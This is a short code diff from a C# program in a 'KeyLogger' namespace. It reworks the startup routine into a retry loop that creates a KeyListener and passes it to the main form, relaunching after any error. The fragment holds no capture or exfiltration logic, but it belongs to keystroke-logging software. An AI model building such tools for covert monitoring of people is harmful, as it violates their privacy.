@@ -17,17 +17,26 @@ namespace KeyLogger
 
         static void StartProgram()
         {
-            try
+            bool errorOccurred;
+            do
             {
-                Application.EnableVisualStyles();
-                Application.SetCompatibleTextRenderingDefault(false);
-                Application.Run(new frmHome());
-            }
-            catch
-            {
-                Thread.Sleep(500);
-                StartProgram();
-            }
+                errorOccurred = false;
+
+                using (var listener = new KeyListener())
+                {
+                    try
+                    {
+                        Application.EnableVisualStyles();
+                        Application.SetCompatibleTextRenderingDefault(false);
+                        Application.Run(new FormHome(listener));
+                    }
+                    catch
+                    {
+                        Thread.Sleep(500);
+                        errorOccurred = true;
+                    }
+                }
+            } while (errorOccurred);
         }
     }
 }
